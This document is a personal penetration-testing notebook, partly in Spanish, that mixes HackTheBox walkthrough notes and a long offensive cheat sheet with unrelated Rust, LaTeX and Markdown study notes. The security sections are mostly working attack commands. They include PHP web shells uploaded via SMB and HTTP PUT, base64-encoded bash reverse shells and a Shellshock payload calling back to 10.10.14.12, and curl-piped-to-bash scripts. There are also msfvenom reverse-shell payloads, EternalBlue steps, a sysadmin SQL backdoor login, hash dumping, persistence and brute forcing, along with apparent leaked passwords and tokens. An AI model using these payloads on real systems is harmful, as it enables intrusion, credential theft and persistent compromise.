Aqui puedo poner lo que quiera ==> In Burp ==> GET /vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&ajgs=milo HTTP/1.1
[+] Running a python script ==> Change https to http | In Burp add port 80 to bind and victim IP 443 and force SSL ==> svmap 10.129.68.60 ==> svwar --force -e 200-250 10.129.68.60 or ❯ svwar -m INVITE -e200-250 10.129.68.60 #To identify valid extensions ==> If we go to browser https://10.129.68.60/panel/ we will be able to see the panel administration ==> Change extensiono and okay

-=-=-=-=-
Knife
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://10.129.216.127/FUZZ/FUZ2Z
[+] curl -s -X GET "http://10.129.216.127/" -I ==> Exploiting User-Agentt

-=-=-==
Friendzone
[+] ftp 10.129.1.225 21 #anonymous & anonymous
[+] openssl s_client -connect 10.129.1.225:443
❯ smbclient -L //10.129.1.225 -N
❯ smbmap -H 10.129.1.225
[+] smbmap -H 10.129.117.106 -R --depth 5
❯ smbmap -H 10.129.1.225  -u 'admin' -p 'WORKWORKHhallelujah@#'
❯ dig axfr @10.129.1.225 friendzoneportal.red # TCP is only used in DNS when the response size is greater than 512 bytes
sed '5,13!d' resultsdig #From line 5 to 13
❯ sed -n -e 5,6p -e 16,17p  resultsdig #If they are not in sequence
[+] cat domains | aquatone 
❯ smbclient //10.129.1.225/Development -N
[+] root@kali# cat cmd.php <?php system($_REQUEST['cmd']); ?> ==> root@kali# smbclient -N //10.10.10.123/Development -c 'put cmd.php 0xdf.php'
❯ sudo mount -t cifs //10.129.1.225/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw #In the script. After that umount and rm -r #https://oletange.blogspot.com/2012/04/umount-device-is-busy-why.html
[+] python3 ==> import hashlib ==> hashlib.md5("password").hexdigest() #Not works but it is interesting
[+] https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login ==> base64 -d and you see the code
Privilege escalation ==> ps -eo command #See all the commands "ejecutando"
[+] library hijacking ==> For example ==> python3 , import sys, print sys.path ==> locate os.py ==> ls -l /usr/lib | grep python2.7 ==> system("chmod 4755 /bin/bash") in os.py

-=-=-=-=-=
Ready (10.129.227.132)

https://docs.gitlab.com/ee/api/version.html
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version --header "PRIVATE-TOKEN: oB2b_mq8DM9Xys39HTkx" | jq
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version --header "PRIVATE-TOKEN: oB2b_mq8DM9Xys39HTkx" | jq '.["version"]'

Or if we register in the page > Help > Version of gitlab

What can we search for?
  When was this release regarding this version?
    gitlab releases 
  Let's go search into the commits
    https://gitlab.com/gitlab-org/gitlab
  What have we found?
   Merge branch 'security-11-5-fix-webhook-ssrf-ipv6' into 'security-11-5' //This commit
   We see that there are many ways to ping the loopback.
    ❯ ping 0x7f.1

  Let's test it
    Projects > Import project > Repo by URL >
      http://127.0.0.1 //    Import url is blocked: Requests to localhost are not allowed
    Can the server connect to us?
      AM: ❯ nc -lvnp 80
          Can't grab 0.0.0.0:80 with bind : Permission denied
          ❯ sudo !!
          sudo nc -lvnp 80
      VM: http://10.10.14.12
    Can we access ports on localhost? Those are not exposed externally 
    Let's try use gopher to craft packets
      gopher://10.10.14.12:80
    With git
      git://10.10.14.12:80/test/test.git //The test.git is copied from clone with ssh
      Can we send lines when doing a connection with us?

    https://github.com/jas502n/gitlab-SSRF-redis-RCE
    
  ❯ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.12/4545 0>&1'" | base64 -w 0;echo

  echo -n YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvNDU0NSAgICAwPiYxJw== | base64 -d | bash

Privilege escalation
Docker
https://github.com/stealthcopter/deepce
VM: curl 10.10.14.12:8080/deepce.sh | bash

mkdir /mnt/sda1
mount /dev/sda1 /mnt/sda1
mkdir /mnt sda2 
mount /dev/sda2 /mnt/sda2

ls /mnt///.......














-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
LaTeX 
zathura #View pdf files 
rubber #Similar to latexmk
[+]apt-get update 
[+] apt-get install texlive-full -y --fix-missing
[+] apt-get install zathura latexmk rubber -y
[+] xdg-mime query default application/pdf ==> xdg-mime default zathura.desktop application/pdf
[+] mkdir /home/ajgs/.config/latexmk ==> nvim ~/.config/latexmk/latexmkrc ==> $pdf_previewer = 'zathura';
[+] chown ajgs:ajgs -R latexmk
[+] Hacer lo mismo para root ==> cd /root ==> cd .config ==> mkdir latexmk ==> cd !$ ==> ln -s -f /home/ajgs/.config/latexmk/latexmkrc latexmkrc 
[+] latexmk -pdf -pvc Documento.tex
[+] zathura Documento.pdf > /dev/null 2>&1 &
[+] xprop WM_CLASS
[+] color #AAAAA

latexmk

-=-=-=
Markdown
[+]Images ==> The first image style is called an inline image link. To create an inline image link, enter an exclamation point ( ! ), wrap the alt text in brackets ( [ ] ), and then wrap the link in parenthesis ( ( ) ). (Alt text is a phrase or sentence that describes the image for the visually impaired.)

For example, to create an inline image link to https://octodex.github.com/images/bannekat.png, with an alt text that says, Benjamin Bannekat, you'd write this in Markdown: ![Benjamin Bannekat](https://octodex.github.com/images/bannekat.png)

For a reference image, you'll follow the same pattern as a reference link. You'll precede the Markdown with an exclamation point, then provide two brackets for the alt text, and then two more for the image tag, like this: ![The founding father][Father] At the bottom of your Markdown page, you'll define an image for the tag, like this: [Father]: http://octodex.github.com/images/founding-father.jpg.

[+] Blockquotes
To create a block quote, all you have to do is preface a line with the "greater than" caret (>).
Notice that even blank lines must contain the caret character. This ensures that the entire blockquote is grouped together.

[+] Lists ==> To create an unordered list, you'll want to preface each item in the list with an asterisk ( * ) ==> An ordered list is prefaced with numbers, instead of asterisks

[+] Paragraphs ==> 2 spaces or a new line 
[+] More tutorials ==> https://www.markdowntutorial.com/conclusion/
-=-=-=-=
Rust

Installing rustup 
$ curl --proto '=https' --tlsv1.3 https://sh.rustup.rs -sSf | sh






cargo new hello_cargo
cargo build
cargo run
cargo check
cargo doc --open
target/debug directory for the executable
target/release ==> optimization
println! calls a Rust macro
let mut guess = String::new(); //String ==> type && new ==> function implemented on a type

println("x = {} and y {}", x, y);

3.1. Variables and mutability
const THREE_HOURS_IN_SECONDS: u32 = 60 * 60 * 3;
shadowing

3.2. Data types
Length	  Signed	    Unsigned
8-bit	    i8  	      u8
16-bit	  i16	        u16
32-bit	  i32,f32	    u32
64-bit	  i64,f64	    u64
128-bit	  i128	      u128
arch	    isize	      usize
4 bytes ==> ' '

Booleans are one byte in size. // let f: bool = false; 
we specify char literals with single quotes, as opposed to string literals, which use double quotes.


To explicitly handle the possibility of overflow, you can use these families of methods provided by the standard library for primitive numeric types:

    Wrap in all modes with the wrapping_* methods, such as wrapping_add
    Return the None value if there is overflow with the checked_* methods
    Return the value and a boolean indicating whether there was overflow with the overflowing_* methods
    Saturate at the value’s minimum or maximum values with saturating_* methods

Tuples
We create a tuple by writing a comma-separated list of values inside parentheses. Each position in the tuple has a type, and the types of the different values in the tuple don’t have to be the same.
fn main() {
  let tup: (i32, f64, u8) = (500, 6.4, 1);
  let (x, y, z) = tup; // Access a individual value in this single compound element
  println!("The value of y is: {}",y);
  //Accesing by the index of the value
  let x: (i32, f64, u8) = (500, 6.4, 1);
  let five_hundred = x.0;
}

Array
Unlike a tuple, every element of an array must have the same type. Unlike arrays in some other languages, arrays in Rust have a fixed length.
fn main() {
  let a: [i32; 5] = [1, 2, 3, 4, 5];
  //Accessing array elements
  let first = a[0]; //1
  //You could write
  let a = [3; 5]; //which is equal to ==> let a = [3, 3, 3, 3, 3];
}

//Example of invalid array element access 

This is an example of Rust’s memory safety principles in action. In many low-level languages, this kind of check is not done, and when you provide an incorrect index, invalid memory can be accessed. Rust protects you against this kind of error by immediately exiting instead of allowing the memory access and continuing.


-=-=
3.3. Functions
Rust doesn’t care where you define your functions, only that they’re defined somewhere in a scope that can be seen by the caller.

Statements vs expressions?
  Statements are instructions that perform some action and do not return a value. 
    Ex: let y = 6; //It is a statement
  Expressions evaluate to a resulting value.
    Do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, and it will then not return a value
    Ex: 5 + 6

3.4. Control flow

fn main() {
    let number = 6;

    if number % 4 == 0 {
        println!("number is divisible by 4");
    } else if number % 3 == 0 {
        println!("number is divisible by 3");
    } else if number % 2 == 0 {
        println!("number is divisible by 2");
    } else {
        println!("number is not divisible by 4, 3, or 2");
    }
}


Using if in a let statement
fn main() {
    let condition = true;
    let number = if condition { 5 } else { 6 };

    println!("The value of number is: {number}");
}

//Rust has three kinds of loops: loop, while and for.
loop
  break
  continue: In a loop tells the program to skip over any remaining code in this iteration of the loop and go to the next iteration.
fn main() {
    let mut counter = 0;

    let result = loop {
        counter += 1;
        if counter == 10 {
            break counter * 2;
        }
    };
    println!("The result is {}",result);
}

Loop Labels to Disambiguate Between Multiple Loops
  Loop labels must begin with a single quote. 

  fn main() {
    let mut count = 0;
    'counting_up: loop {
        println!("count = {}",count);
        let mut remaining = 10;
        

        loop {
            println!("remaining = {}",remaining);
            if remaining == 9 {
                break;
            }
            if count == 2{
                break 'counting_up;
            }
            remaining -= 1;
        }
        count += 1;
    }
    println!("End count = {}", count);
}

Looping through a collection with for
  fn main() {
    for number in (1..4).rev() {
        println!("{number}!");
    }
    println!("LIFTOFF!!!");
}












-=-=-=
Programming c++
a = a + 1; ==> is the same as ++a;
Caution 1 {
  x = 10;
  y = ++x; //Set y to 11
}
Caution 2 {
    x = 1;
    y = x++; //Set y to 10 and x to 11
  }
^ ==> XOR
~ ==> NOT

x = &y; #Put the memory address of the variable y into x. Not the value of y.
y = *p2; #Assigns to variable y, the value located at the memory address pointed by p2.

#define _WINSOCK_DEPRECATED_NO_WARNINGS #Use winsock utilites and we do not want the compiler to complain about older functionalities used.
#pragma comment(lib, "Ws2_32.lib") #In order to use sockets(networking) functionality in Windows
#include <iostream> #Standard input/output utilities
#include <winsock2.h> #Network utilities
#include <stdio.h> #Standard input/output utilities(needed for perror())
#include <stdlib.h> #Standard input/output utilities
#include <dirent.h> #Directory utilities
#include <string> #String utilities

-=-=-=-=
Python3
* Extract source code from a web
	import requests
	import re
	
	url = 'http://144.126.226.105:30024/admin-login-page.php'
	
	data = {
	        'username': 'admin',
	        'password': 'password123'
	}
	
	response=requests.post(url, data=data)
	content = response.text
	
	x = re.findall('<center><strong>(.*)</strong></center>',content)[0]
	print(x)
-=-=-=-=-=-=
Machines for practicing Metasploit

    Granny/Grandpa
    Jerry
    Blue
    Lame
    Optimum
    Legacy
    Devel

-=-=-=-=
#Common Pacman commands
Command	Description
pacman -Syu <pkg>	Install (and update package list)
pacman -S <pkg>	Install only
pacman -Rsc <pkg>	Uninstall
pacman -Ss <keywords>	Search
pacman -Syu	Upgrade everything
pacman -Qe	List explictly-installed packages
pacman -Ql <pkg>	What files does this package have?
pacman -Qii <pkg>	List information on package
pacman -Qo <file>	Who owns this file?
pacman -Qs <query>	Search installed packages for keywords
pacman -Qdt	List unneeded packages
pacman -Rns $(pacman -Qdtq)	Uninstall unneeded packages
pactree <pkg>	What does pkg depend on?
pactree -r <pkg>	What depends on pkg?
* Tools ==> Brute force
	> onesixtyone : Can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool
		https://github.com/trailofbits/onesixtyone
		onesixtyone -c dict.txt 10.129.42.254
####SSH
* SSH can also be used to access Windows host and is now native to Windows 10 since version 1809. 
* SSH authentication can be configured in two ways:
	> Username & password authentication
      	> Key based authentication
    	> Examples:
		use auxiliary/scanner/ssh/ssh_version
		ssh 192.168.188.128 22
    		version? 
    		  	nc 192.168.188.128
    		algorithms that can be used to create the key?
    		  	nmap 192.168.188.128 -p22 --script ssh-enum-algos
    		  	ssh -vv 192.168.188.128
    		get ssh server key fingerprint
    		  	nmap 192.168.188.128 -p22 --script ssh-hostkey --script-args ssh_hostkey=full
    		  	ssh-keyscan host | ssh-keygen -lf -
		[+] Auth methods
    			nmap 192.168.188.128 -p22 --script ssh-auth-methods --script-args "ssh.user=admin"
    		[+] Dictionary attack
    		  	nmap 192.168.188.128 -p22 --script ssh-brute --scritp-args userdb=/root/user 
		[+] Metasploit
    		  	auxiliary/scanner/ssh/ssh_login
    		    		set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
		[+] Other example: We see the reported version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. 
			From inspection of other Ubuntu SSH package changelogs(https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog), we see the release version takes the format 1:7.3p1-1ubuntu0.1. 
			Updating our version to fit this format, we get 1:8.2p1-4ubuntu0.1. 
			In Google ==> '1:8.2p1-4ubuntu0.1 release' ==>  A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04
			In Google ==> 'Ubuntu Linux Focal Fossa 20.04 release date'


####HTTP
* GET /index.html HTTP/1.1 to retrieve the page index.html or GET / HTTP/1.1 to retrieve the default page.
* HTTP is a stateles protocol. Every request is completely unrelated to the ones preceding and following it.
* The cookie jar is the storage space where a web browser stores the cookies. When a web server installs a cookie, it sets the domain field. Then, the browser will use the cookie for every request sent to that domain and all its subdomains. If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname
* -ign_eof
* Websites running PHP install session cookies by using the ==> PHPSESSID, JSP websites use ==> JSESSIONID
* Each development language has its own default session parameter name. Of course, the web developer can also choose to use a custom parameter name
* Session IDs can also be transmitted via GET requests ==> http://example.site/resource.php?sessid=s423ndsd
* Parameter http-only is very important for no access by javascript(document.cookie),java,etc.
* Expires ==> session [expires after close the browser ]
####Fingerprinting with Netcat
* It does not work with encryption
	nc -v www.ferrari.com 80 | GET / HTTP/1.1 Host:www.ferrari.com //Remember that every HTTP request has two empty lines between the header and the body of the reques itself
  	nc -lvnp 8888 (Server) ==> echo 'hello' | nc -v localhost 8888
  	nv example.com 80
  	  HEAD / HTTP/1.0 and hit enter 2 times.
  	  -u : UDP connection
  	  -v : To notify you after the connection to the server
  	  -k : Keep listening after client disconnects
  	  -z: zero I/O

####Fingerprinting with OpenSSL
	openssl s_client -connect hack.me:443 -debug | -state | -quiet and after that OPTIONS HTTP/1.1 Host: hack.me
	openssl x509 -in twitter.com-cert -noout -text
	openssl s_client -connect target.site:443
	HEAD / HTTP/1.0

####Fingerprinting with Httprint
* It uses a signature-based technique to indentify web servers
	httprint -P0 -h <target hosts> -s <signature file>
	-P0 to avoid pinging the host (most web servers do not respond to ping echo requests)

####HTTP methods (Some of them)
* If you use HTTP/1.0, you can skip the Host: header
* OPTIONS (Used to query the web server for enabled HTTP Verbs)
	OPTIONS / HTTP/1.1
    	Host: www.example.site

	curl -X OPTIONS 192.45.178.3 -v

* GET (To request a resource)
	GET /page.php HTTP/1.1 //You can also passa arguments like ==> ... /page.php?course=PTS...
    	Host: www.example.site

    	curl -X GET 192.45.178.3

* POST (To submit HTML form data. POST parameters must be in the message body)
	POST /login.php HTTP/1.1
    	Host: www.example.site

    	username=john&password=mypass

    	curl -X POST 192.45.178.3
    	curl -X POST 192.45.178.3/login.php -d "name=m1l0js&password=m1l0js" -v

* HEAD (Very similar to GET, as it asks just headers of the response instead of the response body)
	HEAD / HTTP/1.1
    	Host: www.example.site

    	curl -I 192.45.178.3
	curl -IL https://www.inlanefreight.com


* PUT (Used to upload a file to the server. It is very dangerous feature if it is allowed and misconfigured)
	PUT /path/to/destination HTTP/1.1
    	Host: www.example.site

    	<PUT data>

    	//You have to know the size of the file you want to upload on the server ==> wc -m payload.php = 20

    	nc victim.site 80
    	PUT /payload.php HTTP/1.0
    	Content-type: text/html
    	Content-length: 20

    	<?php phpinfo(); ?>
    	
    	//Uploading a PHP shell with PUT
    	  nc victim.site 80
    	  PUT /shell.php HTTP/1.0
    	  Content-type: text/html
    	  Content-length: 136 //wc -m shell.php. The code below

    	  <?php
    	  if (isset($_GET['cmd'])) //Runs the following code only if the GET cmd parameter is set
    	  {
    	    $cmd = $_GET['cmd']; //Reads the command to execute
    	    echo '<pre>';
    	    $result = shell_exec($cmd); //Runs the command by using the OS shell
    	    echo $result; //Displays the output of the command
    	    echo '</pre>';
    	  }

    	  [+] In the web browser: victim site/shell.php?cmd=ls


    	curl -X PUT 192.45.178.3
      
* DELETE (Used to remove a file from the server. If misconfigured leads to denial of service and data loss)
	DELETE /path/to/destination HTTP/1.1
    	Host: www.example.site

    	curl -XDELETE 192.45.178.3/uploads/hello.txt


####REST APIs (Representational State Transfer Application Programming Interface)
* Are a specific type of web application that relies strongly on almost all HTTP Verbs. They are often reffered to as 'web services' or simply APIs
* It is sometimes easy to confuse REST APIs PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.


####More enumeration
* Gobuster
	> Directory/File enumeration
		gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt 
	> DNS subdomain enumeration
		> Install Seclists
			git clone https://github.com/danielmiessler/SecLists
			sudo apt install seclists -y
		> Add a DNS server such as 1.1.1.1 to the /etc/resolv.conf
		> Launch the attack
			gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
* Checklist
	gobuster
	Web enumeration tips
		banner grabbing / web server headers
		curl
		whatweb
		robots.txt
		source code

* Some common backup file names are:
	.bak
    	.old
    	.txt
    	.xxx
* dirb
	useragentstring.com //Select another if the server checks it
    	dirb http://google.com -a "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
    	dirb http://google.com -p http://127.0.0.1:8080 -c "COOKIE:XYZ" //To utilise burpsuite
    	dirb http://google.com -p http://127.0.0.1:8080 -u "admin:password"//To utilise credentials
    	dirb http://google.com -p http://127.0.0.1:8080 -H "MyHeader: My content"//To utilise headers
    	  -R : recursively
	  -a : Specify your custom USER_AGENT
    	  -z : Add a miliseconds delay
    	  -X : Extensions ==> -X ".php,.bak,.txt"
    	  -x : Utilise this extensions

* IIS
	whatweb http://192.127.27.3
      	  X-XSS-Protection[0] //It has no xss protection
      	http 192.127.27.3
      	  files ended in .aspx
      	dirb http://192.127.27.3
      	browsh --startup-url http://192.127.27.3/ //Useful when we don't have a browser to access the target application and we have to use the terminal to access the web application
      	nmap
      	  	http-enum
      	  	http-headers
      	  	nmap 10.2.28.225 -sV -p80 --script http-methods  --script-args http-methods.url-path=/webdav/
      	  	nmap 10.2.28.225 -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/

* Apache
	nmap 10.2.28.225 -p80 -sV --script banner      
      	msfconsole
      	  	use auxiliary/scanner/http/http_version
      	  	use auxiliary/scanner/http/brute_dirs
      	  	use auxiliary/scanner/http/robots_txt
      	curl 192.168.188.126 | more
      	wget "http://192.168.188.126/index"
      	browsh --startup-url http://192.168.188.126
      	lynx http://192.168.188.126 
      	dirb http://192.168.188.126 /usr/share/metasploit-framework/wordlists/directory.txt
####MYSQL
* nmap
	nmap 192.168.188.126 -sV -p 3306
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-empty-password
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-info
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-info //List some capabilities
      	  InteractiveClient
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
      	  datadir
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username=root,password=''"


* mysql
	InteractiveClient ==> Access through mysql
	mysql -h 192.168.188.126 -u root
    		show databases;
    	  	use books;
    	  	  select count(*) from authors;
    	  	  select * from authors;
    	select load_file("/etc/shadow");
    	use mysql;
    	select user,password from user;
    	//Get a shell with the mysql client user
    	    \! sh
    	mysql -h 192.228.123.3 -u root -e 'show databases';

      
* Metasploit
	use auxiliary/scanner/mysql/mysql_schemadump
      		set password ""
      	use auxiliary/scanner/mysql/mysql_file_enum
      	  	set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
      	use auxiliary/scanner/mysql/mysql_writable_dirs
      	  	set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
      	  	set password ""
      	use auxiliary/scannner/mysql/mysql_hashdump
      	  	set username root
      	  	set password ""
    	
	dictionary attack
        	use auxiliary/scanner/mysql/mysql_login
          		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
* Hydra
	hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.228.123.3 mysql
####MS-SQL-S
* Nmap
	nmap 192.228.123.3 -p 1433 --script ms-sql-info
      	nmap 192.228.123.3 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
      	nmap 192.228.123.3 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
      	nmap 192.228.123.3 -p 1433 --script ms-sql-empty-password
      	nmap 192.228.123.3 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
      	nmap 192.228.123.3 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
      	nmap 192.228.123.3 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
* Metasploit
	use auxiliary/scanner/mssql/mssql_login
      	  	set user_file /root/Desktop/wordlist/common_users.txt
      	  	set pass_file /root/Desktop/wordlist/100-common-passwords.txt
      	use auxiliary/admin/mssql/mssql_enum
      	use auxiliary/admin/mssql/mssql_enum_sql_logins
      	use auxiliary/admin/mssql/mssql_exec
      	  	set cmd whoami
      	use auxiliary/admin/mssql/mssql_enum_domains_accounts
* Manual
      [+] Using Impacket mssqlclient.py
		mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
      [+] Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
      		mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
      
* Sqsh
	sqsh -S <IP> -U <Username> -P <Password> -D <Database>
	[+] In case Windows Auth using "." as domain name for local user
      	sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
	[+] In sqsh you need to use GO after writting the query to send it
      		1> select 1;
      		2> go
	[+] Get version
      		select @@version;
      	[+] Get user
      		select user_name();
      	[+] Get databases
      		SELECT name FROM master.dbo.sysdatabases;
      	[+] Use database
      		USE master
      	[+] Get table names
      		SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
      	[+] List Linked Servers
      		EXEC sp_linkedservers
      		SELECT * FROM sys.servers;
      	[+] List users
      		select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
      	[+] Create user with sysadmin privs
      		CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
      		sp_addsrvrolemember 'hacker', 'sysadmin'





####Metasploit (Falta por ordenar)
* Before start
	service PostgreSQL start
    	service metasploit start
* Some useful modules
	auxiliary/scanner/discovery/arp_sweep
    	auxiliary/scanner/portscan/tcp
    	nmap --script smb-vulns-check.nse --script-args=unsafe=1 demo.ine.local


[+] Once msfconsole -q //We could use it
	msfupdate
  	search <mysearchterm> //search linux
  	show exploits //Not very practical to use.
	check //It would check if the service on the target is vulnerable to this exploit or not, instead of actually exploiting it.
  	back //If you want back to main prompt 
  	background //To return
	exploit / run
    exploit -j // Run it as a job
    jobs -l //List jobs
  	> Example
  		search  httpfileserver
  	  	use exploit/windows/http/rejetto_hfs_exec
  	  	info
  	  	show options
  	  	show payloads
  	  	exploit
  	  	Privilege escalation 
			sessions -l  //List sessions
			sessions -i 1 //Attach to a session
			sysinfo
			ipconfig
			route
			ps //List processes 
				ps -U SYSTEM
			getpid //See our process
			getuid //To know which user is running the process exploited by Metasploit
			getsystem // It runs a privilege escalation routine on the target machine.
			> Check if UAC is enabled
				post/windows/gather/win_privs
				> If you need to bypass the UAC 
			    		search bypassuac
			    		set session <select which you want>
			
			use post/windows/gather/hashdump //It dumps the password database of a Windows machine
				set session <session id>
			Uploading and Downloading files
				download HaxLogs.log /root/
			  	upload /root/backdoor.exe C:\\Windows //Note the backslash escaping
			shell //A standard operating system shell
  	    	Persistence
  	    		exploit/windows/local/persistence
  	    	  	background
  	    		/exploit/multi/handler //To kill all the sessions and check if we have installed the backdoor
  	    	Remote port forwarding: After using auxiliary/scanner/portscan/tcp we could forward a remote machine port to the local machine port.
  			portfwd add -l 1234 -p 21 -r 192.168.228.3
  			portfwd lst 
  			background 
  			nmap -sS -sV -p 1234 localhost
  	> search meterpreter
  		Reverse shell
  			set payload windows/meterpreter/reverse/tcp
  		  	set payload linux/x86/meterpreter/reverse_tcp
  		Bind shell
  			set payload windows/meterpreter/bind_tcp
  		  	set payload java/meterpreter/bind_tcp

	> Another example
  		We could now check their home directory to find interesting files or alternatively leverage interesting modules such as
 		post/linux/gather/enum_users_history 
		or 
  	    	exploit/multi/mysql/mysql_udf_payload: It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.
  	      		set FORCE_UDF_UPLOAD true
  	      		set PASSWORD fArFLP29UySm4bZj
  	      		set RHOSTS server2.ine.local
  	      		set TARGET 1
  	      		set LHOST 192.73.96.2
  	      		exploit
  	      		session -i 2
  	    	auxiliary/scanner/http/tomcat_mgr_login: We will use msfvenom command to generate a malicious WAR file in order to gain the shell session on the Tomcat server
  	    	    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war > shell.war
  	    	    file shell.war


  

-=-=-=
-=-=-=-=-=-
##Vulnerability Assessment
###Linux Vulnerabilities

* Shellshock
	(){:;};.
    	> In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack
    	  CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.
	[+] Ways 
    		> Manually
    			nmap -sV  192.168.188.126 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
    	      		In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
    	      		In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>& /dev/tcp/10.10.14.12/4126 0>&1'
    	      		Another way:
    	      		  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://195.76.205.3:4127/gettime.cgi
    	    	> Metasploit 
    	      		use exploit/multi/http/apache_mod_cgi_bash_env_exec 
    	      			set targeturi /gettime.cgi
###Frequently exploited Windows services
Microsoft IIS(Internet Information Services)    80/443    Propietary web server software developed by Microsoft that runs on Windows
WebDAV(Web Distributed Authoring & Versioning)  80/443    HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server for colllaborative authoring
SMB/CIFS(Server Message Block Protocol)         445       Network file sharing protocol that is used to facilitate the sharing of files and peripherals(printers and serial ports) between computers on LAN
RDP(Remote Desktop Protocol)                    3389      Propietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system
WinRM(Windows Remote Management Protocol)       5986/443  Windows remote management protocol that can be used to facilitate remote access with Windows systems
###PsExec
* It is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials.
* PsExec authentication is performed via SMB. 
* We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
* Similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
  	nmap -sCV 192.168.188.126
	msfconsole
  		use scanner/smb/smb_login
  			set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
  	    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
* Once we have gained credentials
	[+] psexec.py
		psexec.py administrator@192.168.188.126 cmd.exe
	[+] metasploit
		use exploit/windows/smb/psexec
  		      set smbuser administrator
  		      set smbpass qweryuiop

###Eternalblue
* Nmap
	sudo nmap -sV -p445 -O 10.2.25.40
	nmap -sV -p445 10.2.25.40 smb-vuln-ms17-010
* Manually
	git clone https://github.com/3ndG4me/AutoBlue-MS17-010
  	pip install -r requirements.txt
  	cd shellcode
  	shell_prep.sh
  	msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.188.128 LPORT=4126
  	sc_x64.bin or sc_x86.bin
  	nc -lvnp 4126
  	python3 eternalblue_exploit7.py 192.168.188.126 /shellcode/sc_x64.bin
* Metasploit
        use windows/smb/ms17_010_eternalblue

###BlueKeep Vulnerability  
* This vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature.
* Nmap 
	nmap -p 3389 192.168.188.126 
* Metasploit
	search BlueeKeep
        check
